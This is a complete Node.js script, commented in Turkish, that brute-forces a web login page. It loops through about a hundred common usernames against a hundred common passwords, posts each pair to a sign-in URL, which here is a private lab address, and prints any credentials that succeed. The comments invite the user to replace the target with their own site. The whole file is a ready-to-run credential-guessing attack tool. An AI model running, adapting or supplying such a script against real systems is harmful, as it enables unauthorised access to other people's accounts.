// Node.js 18+ için fetch otomatik mevcut
// Eğer daha eski Node.js kullanıyorsanız: npm install node-fetch
// ve şu satırı ekleyin: const fetch = require('node-fetch');

// Top 100 en yaygın kullanıcı adları
const commonUsernames = [
    'admin', 'administrator', 'root', 'user', 'test', 'guest', 'info', 'adm',
    'mysql', 'user1', 'administrator', 'oracle', 'ftp', 'pi', 'puppet', 'ansible',
    'ec2-user', 'vagrant', 'azureuser', 'demo', 'ubuntu', 'test1', 'test2', 'test3',
    'postgres', 'support', 'service', 'backup', 'oracle', 'testuser', 'joe', 'john',
    'jane', 'mike', 'david', 'service', 'webadmin', 'web', 'www', 'www-data',
    'mail', 'email', 'sales', 'sales1', 'info', 'marketing', 'support', 'help',
    'it', 'tech', 'itadmin', 'sysadmin', 'dba', 'manager', 'director', 'ceo',
    'cto', 'dev', 'developer', 'devops', 'deploy', 'jenkins', 'git', 'github',
    'gitlab', 'docker', 'kubernetes', 'admin1', 'admin2', 'admin3', 'operator',
    'operator1', 'adminstrator', 'admins', 'sys', 'system', 'super', 'superuser',
    'supervisor', 'supervisor1', 'manager1', 'manager2', 'superman', 'batman',
    'superadmin', 'sql', 'mysql', 'postgres', 'mssql', 'db', 'database', 'dbadmin',
    'monitoring', 'nagios', 'zabbix', 'grafana', 'prometheus'
];

// Top 100 en yaygın şifreler
const commonPasswords = [
    '123456', 'password', '12345678', 'qwerty', 'abc123', '123456789', '111111',
    '1234567', 'iloveyou', 'adobe123', '123123', 'admin', '1234567890', 'letmein',
    'photoshop', '1234', 'monkey', 'shadow', 'sunshine', '12345', 'password1',
    'princess', 'azerty', 'trustno1', '000000', 'access', 'welcome', 'login',
    'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1', '654321',
    'jordan23', 'harley', 'password123', 'hunter', 'hunter2', 'ranger', 'jordan',
    'jennifer', 'zxcvbnm', 'asdfgh', 'veronica', 'buster', '1234567890', '123qwe',
    'michael', 'charlie', 'michelle', 'scooter', 'superman', 'qwerty123', 'qwer1234',
    'football', 'baseball', 'welcome123', '1qaz2wsx', '1q2w3e4r', 'q1w2e3r4t5',
    'letmein1', 'Password1', 'Password123', 'Passw0rd', 'admin123', 'root123',
    'toor', 'pass', 'pass123', 'p@ssw0rd', 'p@ssword', 'P@ssw0rd', 'P@ssword123',
    'Qwerty123', '1q2w3e4r5t', 'zaq1xsw2', 'xsw2zaq1', '1qazxsw2', 'welcome1',
    'welcome123!', 'abc123!', 'iloveyou1', 'sunshine1', 'princess1', 'qwerty1',
    'master1', 'admin1', 'root1', 'test123', 'demo123', 'guest123', 'user123',
    'password12', 'password1234', 'Password12', 'Passw0rd1', 'Admin123',
    'Root123', 'test', 'demo', 'guest', 'user', '12345', '54321', 'qwerty12'
];

// Sign-in fonksiyonu - Sitenizin URL'ini buraya yazın
async function login(username, password) {
    const url = 'http://192.168.75.128/index.php?page=signin'; // Sitenizin login URL'ini buraya yazın
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });

        const data = await response.json();
        
        // Başarılı login kontrolü - Sitenizin yanıtına göre düzenleyin
        return {
            success: response.ok && !data.error && !data.message?.includes('yanlış'),
            response: data
        };
    } catch (error) {
        throw error;
    }
}

// Brute force ana fonksiyonu
async function bruteForce() {
    const delay = 100; // Her deneme arası bekleme süresi (ms)
    let attempts = 0;
    let found = false;

    console.log('Brute force başlatılıyor...');
    console.log(`Toplam kombinasyon: ${commonUsernames.length * commonPasswords.length}\n`);

    for (const username of commonUsernames) {
        if (found) break;

        for (const password of commonPasswords) {
            attempts++;
            
            try {
                console.log(`[${attempts}] Deneniyor: ${username} / ${password}...`);
                
                const result = await login(username, password);
                
                if (result && result.success) {
                    console.log(`\n✅ BULUNDU!`);
                    console.log(`   Kullanıcı: ${username}`);
                    console.log(`   Şifre: ${password}`);
                    console.log(`   Deneme sayısı: ${attempts}\n`);
                    found = true;
                    break;
                }
            } catch (error) {
                console.error(`Hata (${username}/${password}):`, error.message);
            }

            // Her deneme arasında bekle
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    if (!found) {
        console.log('\n❌ Hiçbir geçerli kullanıcı adı/şifre bulunamadı.');
    }
}

// Çalıştır
bruteForce().then(() => {
    process.exit(0);
}).catch(error => {
    console.error('Fatal hata:', error);
    process.exit(1);
});

